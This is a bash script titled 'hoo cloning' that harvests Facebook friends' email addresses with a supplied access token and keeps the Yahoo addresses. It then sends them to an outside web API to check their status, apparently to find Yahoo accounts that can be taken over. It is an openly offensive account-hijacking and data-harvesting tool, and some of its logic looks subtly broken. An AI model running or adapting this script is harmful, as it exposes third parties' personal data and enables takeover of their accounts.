#!/bin/bash
# -(c) zsecc0de-crew.id ~ widhisec
# -createon   : 16/04/2019
# -toolsname  : hoo cloning
clear;
command -v curl > /dev/null 2>&1 || { echo >&2 "cURL not installed [!]"; }
GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
NORMAL=$(tput sgr0)
CYAN=$(tput setaf 6)
function banner () {
printf "
\t$GREEN.__                   
\t|  |__   ____   ____  
\t|  |  \ /  _ \ /  _ \  [${RED}Create By ${CYAN}Widhisec]
\t|   Y  (  <_> |  <_> ) 
\t|___|  /\____/ \____/ 
\t     \/  
\t
"
}
banner
function get_yahoo () {
                   get_yahoo=$(curl --silent "http://widhitools.000webhostapp.com/api/yahoo.php?" --data "email=$i" | 
                   jq -r .status)
                   printf "$aa > $get_yahoo" >> yahoo.txt
                   printf "${CYAN}$aa [STATUS] > ${NORMAL}$get_yahoo\n"
}
function hey_kamu () {
	           echo -e -n $RED'[?]'${NORMAL}'Token : ' 
	           read t0k3n
	           echo "loading."
                   sleep 1
                   echo "loading.."
                   sleep 1
                   echo "loading..."
                   sleep 1
                   echo "loading...."
                   sleep 1
                   echo "loading....."
                   sleep 1
                   echo "loading......"
                   sleep 1
                   echo "loading......."
                   sleep 1
                   gEt=$(curl -Gs "https://graph.facebook.com/v3.2/me/friends/?fields=email&access_token=`cat $t0k3n`&limit=299" | jq -r .data | grep -Po '(?<="email":)[^,]*' | tr -d '""' | 
                   grep @yahoo.com)
                   printf "(?)nama folder: "; read name
                   printf "$gEt\n" >> $name
                   echo -e -n $RED'[?]'$NORMAL'List here : '; read i
                   for aa in `cat $i`; do
                   	 get_yahoo
                   done
}
hey_kamu %20
